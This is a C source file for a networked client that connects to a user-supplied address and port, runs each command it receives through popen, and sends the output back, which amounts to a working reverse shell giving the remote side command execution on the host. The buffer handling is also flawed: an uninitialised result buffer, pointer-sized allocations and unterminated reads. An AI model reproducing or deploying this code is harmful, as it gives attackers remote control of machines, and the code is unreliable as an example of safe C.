#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

const int MAXSIZE = 65536;
const int PATH_MAX = 128000;

int main(int argc, char** argv){
	if(argc < 3){
		printf("Usage: ./client remote_address remote_port");
		exit(EXIT_FAILURE);
	}
	short int portno;
	portno = atoi(argv[2]);

	int client_sock = socket(AF_INET, SOCK_STREAM, 0);
	struct sockaddr_in server_addr;
	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.s_addr = inet_addr(argv[1]);
	server_addr.sin_port = htons(portno);

	if(connect(client_sock, (struct sockaddr *) &server_addr, sizeof(server_addr)) < 0){
    	perror("connect(): ");
        exit(0);
	}
	else{
		char* servername = malloc(INET_ADDRSTRLEN);
		printf("Connected to %s\n", inet_ntop(AF_INET, &server_addr, servername, INET_ADDRSTRLEN));
	}

	int bytes = 0;
	char *command_received = malloc(MAXSIZE);
	 bzero(command_received, MAXSIZE);

	FILE* pipe;
	char path[PATH_MAX];

	char* result = realloc(NULL, sizeof(result)*PATH_MAX);
	int length = PATH_MAX;
	while(1)
	{
		if((bytes = read(client_sock , command_received , MAXSIZE)) < 0){
			puts("recv failed: ");
			break;
		}
//		printf("Server command: %s, bytes read: %d\n", command_received, bytes);
		pipe = popen(command_received, "r");
		while(fgets(path, PATH_MAX, pipe) != NULL){
			printf("%s", path);
			strcat(result, path);
			if(strlen(result) >= length){
				result = realloc(result, sizeof(result)*(length = length + PATH_MAX));
				if(!result){
					perror("Realloc failed: ");
					pclose(pipe);
					exit(EXIT_FAILURE);
				}
			}
		}
		if( (bytes = send(client_sock, result, strlen(result) , 0)) < 0){
			puts("Send failed");
			pclose(pipe);
			return 1;
		}
		bzero(command_received, MAXSIZE);
		bzero(path, strlen(path));
		bzero(result, strlen(result));
		pclose(pipe);
	}

	close(client_sock);
	if(command_received){
		free(command_received);
	}
	printf("connection closed\n");
	return 0;
}
